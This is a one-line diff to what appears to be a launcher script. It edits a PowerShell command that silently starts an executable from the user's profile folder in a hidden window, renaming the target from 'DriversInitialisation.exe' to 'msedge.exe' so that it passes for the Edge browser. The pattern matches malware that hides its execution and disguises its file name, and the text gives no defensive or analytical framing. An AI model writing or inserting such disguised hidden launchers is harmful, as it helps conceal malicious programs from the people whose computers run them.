@@ -1,1 +1,1 @@
-powershell Start-Process "%USERPROFILE%\DriversInitialisation.exe" -WindowStyle Hidden
+powershell Start-Process "%USERPROFILE%\msedge.exe" -WindowStyle Hidden
